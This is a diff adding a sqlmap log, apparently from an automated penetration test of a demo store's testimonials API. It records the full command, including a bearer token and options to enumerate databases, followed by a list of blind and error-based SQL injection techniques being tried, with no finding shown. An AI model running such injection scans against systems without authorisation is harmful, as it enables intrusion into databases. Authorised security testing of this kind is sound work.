@@ -1,0 +1,36 @@
+# command: cd /work && timeout 120 sqlmap -u "https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=10" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjk4YjBhOTEtNzY3Zi00MDgwLWIyZWUtYzE3OGYwMDg3MjhiIiwidXNlcm5hbWUiOiJ0ZXN0dXNlckFfMTIzIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2OTU0Mzh9.J59tThpOLOZtutUZrAljNP6a0QpJfGmkjTTuo6CjOm8" --batch --level=3 --risk=2 --dbs --threads=4 2>&1 | tail -30
+# tool: sqlmap
+# exit_code: 0
+# ts: 2026-09-29T16:10:26.402509+00:00
+# ---
+
+[16:08:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[16:08:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[16:08:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[16:09:00] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[16:09:09] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[16:09:17] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[16:09:27] [INFO] testing 'SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)'
+[16:09:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:09:36] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[16:09:36] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
+[16:09:36] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
+[16:09:37] [INFO] testing 'Informix boolean-based blind - Parameter replace'
+[16:09:38] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
+[16:09:38] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[16:09:39] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[16:09:39] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[16:09:39] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[16:09:39] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[16:09:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[16:09:40] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[16:09:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[16:09:42] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
+[16:09:44] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[16:09:54] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[16:09:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
+[16:10:04] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[16:10:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[16:10:11] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[16:10:16] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:10:20] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
